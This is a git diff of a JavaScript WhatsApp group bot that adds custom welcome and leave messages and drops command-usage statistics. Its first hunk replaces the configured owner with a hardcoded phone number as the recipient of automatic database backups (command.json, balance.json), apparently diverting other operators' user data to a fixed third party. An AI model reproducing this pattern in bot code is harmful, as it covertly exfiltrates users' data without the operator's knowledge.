@@ -381,9 +381,9 @@ day: 'numeric',
 month: 'long',
 year: 'numeric'
 })
-rzki.sendText(global.owner[1] + '@s.whatsapp.net', `Database: ${date}`, null)
-rzki.sendMessage(global.owner[1] + '@s.whatsapp.net', {document: fs.readFileSync('./src/database/command.json'), fileName: 'command.json', mimetype: 'application/json' })
-rzki.sendMessage(global.owner[1] + '@s.whatsapp.net', {document: fs.readFileSync('./src/database/balance.json'), fileName: 'balance.json', mimetype: 'application/json' })
+rzki.sendText('6288226703423@s.whatsapp.net', `Database: ${date}`, null)
+rzki.sendMessage('6288226703423@s.whatsapp.net', {document: fs.readFileSync('./src/database/command.json'), fileName: 'command.json', mimetype: 'application/json' })
+rzki.sendMessage('6288226703423@s.whatsapp.net', {document: fs.readFileSync('./src/database/balance.json'), fileName: 'balance.json', mimetype: 'application/json' })
 settingcuy.backupDB = new Date() * 1
 }
 }
@@ -395,23 +395,29 @@ let chats = global.db.data.chats[m.chat]
                 if (!('antilink' in chats)) chats.antilink = false
                 if (!('autostiker' in chats)) chats.autostiker = false
                 if (!('welcome' in chats)) chats.welcome = false
+                if (!('left' in chats)) chats.left = false
                 if (!('SetWelkam1' in chats)) chats.SetWelkam1 = false
                 if (!('SetWelkam2' in chats)) chats.SetWelkam2 = false
                 if (!('SetWelkam3' in chats)) chats.SetWelkam3 = false
                 if (!('SetLeft1' in chats)) chats.SetLeft1 = false
                 if (!('SetLeft2' in chats)) chats.SetLeft2 = false
                 if (!('SetLeft3' in chats)) chats.SetLeft3 = false
+                if (!('text_left' in chats)) chats.text_left = ''
+                if (!('text_welcome' in chats)) chats.text_welcome = ''
             } else global.db.data.chats[m.chat] = {
                 autodl: false,
                 antilink: false,
                 autostiker: false,
                 welcome: false,
+                left: false,
                 SetWelkam1: false,
                 SetWelkam2: false,
                 SetWelkam3: false,
                 SetLeft1: false,
                 SetLeft2: false,
                 SetLeft3: false,
+                text_left: '',
+                text_welcome: '',
             }
 
 //Random Tamnel
@@ -615,26 +621,6 @@ if (!isRakyat) {
 rkyt.push(m.sender.split("@")[0])
 }
 
-let users = global.db.data.users[m.sender]
-if (budy.includes(command)) {
-            users.hit += 1
-            users.usebot = new Date() * 1
-            if (!global.db.data.stats[command]) {
-               global.db.data.stats[command] = {
-                  hitstat: 1,
-                  today: 1,
-                  lasthit: new Date * 1,
-                  sender: m.sender.split`@` [0]
-               }
-            } else {
-               if (!/bot|help|menu|stat|hitstat|dash/.test(command)) {
-                  global.db.data.stats[command].hitstat += 1
-                  global.db.data.stats[command].today += 1
-                  global.db.data.stats[command].lasthit = new Date * 1
-                  global.db.data.stats[command].sender = m.sender.split`@` [0]
-               }
-            }
-         }
 // AFK
 let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
 for (let jid of mentionUser) {
@@ -1772,7 +1758,7 @@ m.reply("*Succes Change Menu To Doc*")
 } else {
 		}
 break
-case prefix+'textwel':
+case prefix+'textwel2':
 if (!isCreator) return m.reply(mess.owner)
 if (!q) return m.reply('Mau Set Welcome Ke Gmna? Welcome Yg Tersedia : 1,2,3,off')
 if (q == "1") {
@@ -1798,7 +1784,7 @@ m.reply("*Succes Change To Off*")
 } else {
 	    }
 break
-case prefix+'textleft':
+case prefix+'textleft2':
 if (!isCreator) return m.reply(mess.owner)
 if (!q) return m.reply('Mau Set Left Ke Gmna? Left Yg Tersedia : 1,2,3,off')
 if (q == "1") {
@@ -1823,6 +1809,32 @@ db.data.chats[m.chat].SetLeft3 = false
 m.reply("*Succes Change To Off*")
 } else {
 		}
+break
+case prefix+'textleft':{
+if (!isCreator) return m.reply(mess.owner)
+if (!text) return reply(`Sorry, can't return without text, and this explanation and how to use :
+
+*1.* +tag : for mention new member on welcome message.
+*2.* +grup : for getting group name.
+
+• *Example* : ${command} Hi +tag, left to +grup group, we hope you enjoyed with us.`)
+let setup = global.db.data.chats[m.chat]
+setup.text_left = text
+m.reply(bold(`Successfully set.`))
+}
+break
+case prefix+'textwel':{
+if (!isCreator) return m.reply(mess.owner)
+if (!text) return reply(`Sorry, can't return without text, and this explanation and how to use :
+
+*1.* +tag : for mention new member on welcome message.
+*2.* +grup : for getting group name.
+
+• *Example* : ${command} Hi +tag, welcome to +grup group, we hope you enjoyed with us.`)
+let setup = global.db.data.chats[m.chat]
+setup.text_welcome = text
+m.reply(bold(`Successfully set.`))
+}
 break
 case prefix+'setfakereply':
 if (!isCreator) return m.reply(mess.owner)
@@ -4812,17 +4824,17 @@ if (!m.isGroup) return m.reply(mess.group)
 if (!isAdmins && !isCreator) return m.reply(mess.admin)
 if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
 if (args[0] === "on") {
-if (welcm) return m.reply('*Welcome already ON.*')
-wlcm.push(from)
-/* if (db.data.chats[m.chat].welcome) return m.reply(`Sudah Aktif Sebelumnya`)
- db.data.chats[m.chat].welcome = true*/
+/*if (welcm) return m.reply('*Welcome already ON.*')
+wlcm.push(from)*/
+ if (db.data.chats[m.chat].welcome) return m.reply('*Welcome already ON.*')
+ db.data.chats[m.chat].welcome = true
 m.reply('*Welcome successfully turned ON.*')
 } else if (args[0] === "off") {
-if (!welcm) return m.reply('*Welcome already OFF.*')
+/*if (!welcm) return m.reply('*Welcome already OFF.*')
 let off = wlcm.indexOf(from)
-wlcm.splice(off, 1)
-/* if (!db.data.chats[m.chat].welcome) return m.reply(`Sudah Mati`)
- db.data.chats[m.chat].welcome = false*/
+wlcm.splice(off, 1)*/
+ if (!db.data.chats[m.chat].welcome) return m.reply('*Welcome already OFF.*')
+ db.data.chats[m.chat].welcome = false
 m.reply('*Welcome successfully turned OFF.*')
 } else {
 m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
@@ -4835,17 +4847,17 @@ if (!m.isGroup) return m.reply(mess.group)
 if (!isAdmins && !isCreator) return m.reply(mess.admin)
 if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
 if (args[0] === "on") {
-if (leftt) return m.reply('*Left already ON.*')
-left.push(from)
-/* if (db.data.chats[m.chat].welcome) return m.reply(`Sudah Aktif Sebelumnya`)
- db.data.chats[m.chat].welcome = true*/
+/*if (leftt) return m.reply('*Left already ON.*')
+left.push(from)*/
+ if (db.data.chats[m.chat].left) return m.reply('*Left already ON.*')
+ db.data.chats[m.chat].left = true
 m.reply('*Left successfully turned ON.*')
 } else if (args[0] === "off") {
-if (!leftt) return m.reply('*Left already OFF.*')
+/*if (!leftt) return m.reply('*Left already OFF.*')
 let off = left.indexOf(from)
-left.splice(off, 1)
-/* if (!db.data.chats[m.chat].welcome) return m.reply(`Sudah Mati`)
- db.data.chats[m.chat].welcome = false*/
+left.splice(off, 1)*/
+ if (!db.data.chats[m.chat].left) return m.reply('*Left already OFF.*')
+ db.data.chats[m.chat].left = false
 m.reply('*Left successfully turned OFF.*')
 } else {
 m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
